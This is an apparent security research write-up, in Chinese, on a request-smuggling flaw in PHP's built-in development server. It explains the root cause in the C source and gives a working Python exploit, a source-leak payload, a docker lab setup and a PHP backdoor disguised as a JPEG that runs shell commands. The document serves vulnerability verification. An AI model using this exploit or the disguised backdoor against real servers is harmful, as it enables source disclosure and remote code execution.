# PHP 内置服务器（php -S）请求走私 —— 源码泄露 / RCE

**别名：CNVD-2026-10837**（国家信息安全漏洞共享平台，危害级别高，评分 10.0，
`AV:N/AC:L/Au:N/C:C/I:C/A:C`，公开日期 2026-03-12，报送者 hama）

**本机 docker 实测验证**（PHP 7.4.21，两面均打通）。原研究环境为 **Windows + PHP 7.3.4**
（`php -S 127.0.0.1:8888`，win32），PoC 回显 `Phantom!attack-zhihao\attac`（`system("whoami")` 输出）。

## 根因

`sapi/cli/php_cli_server.c` 中 `php_cli_server_request` 是**每个 TCP 连接一份、跨该连接所有请求共享**的单例
（内嵌在 `php_cli_server_client` 结构里，不在回调中重置）：

```c
typedef struct php_cli_server_client {
  ...
  unsigned int request_read:1;          // 标志设得太晚
  php_cli_server_request request;       // ★ 共享单例
} php_cli_server_client;
```

`php_cli_server_client_read_request()` 把 16KB `buf` **一次性**交给 `php_http_parser_execute()`：

```c
char buf[16384];
if (client->request_read) { return 1; }        // 只在入口查一次，挡不住内部多请求
nbytes_read = recv(client->sock, buf, sizeof(buf) - 1, 0);
nbytes_consumed = php_http_parser_execute(&client->parser, &settings, buf, nbytes_read);
```

解析器在**同一次调用内**依次为 buffer 里的每个请求触发回调，但请求间**没有状态隔离**：

| 环节 | 缺陷 |
|---|---|
| `request.ext` | 声明为 `const char *ext;` —— **指向 `vpath` 内部的裸指针**；vpath 释放/重分配后成悬空指针 |
| `translate_vpath()` | 目标文件不存在 → **提前 return**，`path_translated` 保留上一个请求的值 |
| `on_message_complete` | `request_read = 1` 在函数**末尾**，而解析器继续吃同一 buffer 里的下一个请求 |
| `extract_extension()` | 照常从**新 vpath** 提取并覆盖 `ext` |
| `dispatch()` | `if (ext_len != 3 \|\| memcmp(ext,"php",3) \|\| !path_translated) is_static_file = 1;` |

一句话：**第一个请求的 `path_translated` + 第二个请求的 `ext` = 类型混淆**。

机制图（研究文档原图，最直观）：
```
请求1: GET /file.bak  → 路径转换: /var/www/file.bak   扩展名: bak
请求2: POST /any.php  → 路径转换: /var/www/file.bak (未改变!)  扩展名: php (覆盖!)
Dispatch: ext=="php" && path_translated != NULL
结果: 将 file.bak 当作 PHP 执行!
```

## 两个方向（同一个 bug）

| 幽灵请求的 `ext` | `dispatch()` 结果 | 后果 |
|---|---|---|
| `ext_len != 3`（如请求 `/` 无后缀） | `is_static_file = 1` | `.php` 当静态文件返回 → **源码泄露** |
| `ext == "php"`（请求不存在的 `/x.php`） | `is_static_file = 0` | 任意三字符后缀文件当脚本跑 → **RCE** |

## 前提条件（实测钉死的三条，缺一不可）

1. **两个请求必须在同一个 read 缓冲区**（同一次 `send()`/同一 TCP 包）
   → 分两次 write（哪怕只隔 0.35s）**不触发**；各自独立连接**不触发**
2. **第一个文件必须真实存在**，后缀任意且长度=3（`.jpg` `.bak` `.png` 均可）
3. **幽灵请求的文件必须不存在**，且后缀是 `php`
   → 若它存在，`translate_vpath` 正常覆盖 `path_translated`，执行的是它自己

## 受影响 / 修复

- 影响：**PHP ≤ 7.4.21**，目标用 `php -S` 启动
- 修复：**PHP 7.4.22**
- 前置反代（nginx/apache）会挡掉——多下游会重新分包

## 利用

```python
import socket
H=b"Host: 127.0.0.1\r\n"
s=socket.socket(); s.settimeout(6); s.connect(("127.0.0.1",8888))
# 关键：单次 send，两个请求同包
s.send(b"GET /pic.jpg HTTP/1.1\r\n"+H+b"\r\n"       # ① 存在的三字符后缀后门文件
       b"GET /ghost.php HTTP/1.1\r\n"+H+b"\r\n")     # ② 不存在的 .php
buf=b''
while True:
    d=s.recv(65536)
    if not d: break
    buf+=d
print(buf.decode('latin1','replace'))
```

**源码泄露版本**（ProjectDiscovery 原始 PoC）：
```
GET /src.php HTTP/1.1\r\nHost: x\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n
```

## ★ 验证靶场（一条命令）

```bash
docker run -d --name php_builtin_lab -p 8888:8888 \
  -v /path/to/webroot:/webroot:ro \
  php:7.4.21-cli php -S 0.0.0.0:8888 -t /webroot
```

webroot 需要：
```
# pic.jpg（伪装图片的后门，任意三字符后缀都行）
\xff\xd8\xff\xe0
<?php echo "PWN_".(6*7)."_OK\n"; echo "U=".trim(shell_exec("id"))."\n"; ?>
# src.php（用于验证源码泄露方向）
<?php echo "PWN_".(6*7)."_OK"; ?>
```

## ★★ 代价血写出来的教训：预言机设计

验证时**标记字符串必须不出现在源码里**，否则「静态返回原文」与「成功执行」无法区分：

| 写法 | 后果 |
|---|---|
| `echo "SMUGGLING_RCE_OK";` | ✘ 源码里就有这串 → 静态返回也命中 → **假阳性** |
| `echo "PWN_" . (6*7) . "_OK";` | ✔ 源码无 `PWN_42_OK` 字面量 → 只有执行才出现 |

同时用**两个互补预言机**交叉：
- 出现 `<?php` → 拿到源码（泄露方向）
- 出现 `PWN_42_OK` / `U=uid=` → 真执行（RCE 方向）

## 侦察指纹

- 响应头 `X-Powered-By: PHP/7.4.21` + `Server: PHP/7.4.21 Development Server`
- 无 `Server` 版本时：用幽灵请求探行为（单包双请求看 `.php` 是否被当静态返回）
- 直接访问 `.php` 正常执行 ≠ 安全；必须测**同包双请求**
